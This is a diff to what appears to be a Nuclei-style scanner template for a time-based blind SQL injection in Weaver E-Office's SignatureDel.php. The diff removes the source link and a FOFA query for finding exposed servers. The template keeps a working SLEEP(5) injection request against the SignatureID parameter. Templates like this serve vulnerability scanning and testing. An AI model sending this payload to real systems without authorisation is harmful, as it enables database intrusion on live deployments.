@@ -3,14 +3,8 @@ info:
   name: 泛微E-Office SignatureDel.php 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wqsiwqgltlwzbg55
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wqsiwqgltlwzbg55
-    fofa: '((header="general/login/index.php" || body="/general/login/view//images/updateLoad.gif" || (body="szFeatures" && body="eoffice") || header="Server: eOffice") && body!="Server: couchdb") || banner="gen'
 http:
 - raw:
   - GET /iWebOffice/Signature/SignatureDel.php?SignatureID=1+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))x) HTTP/1.1
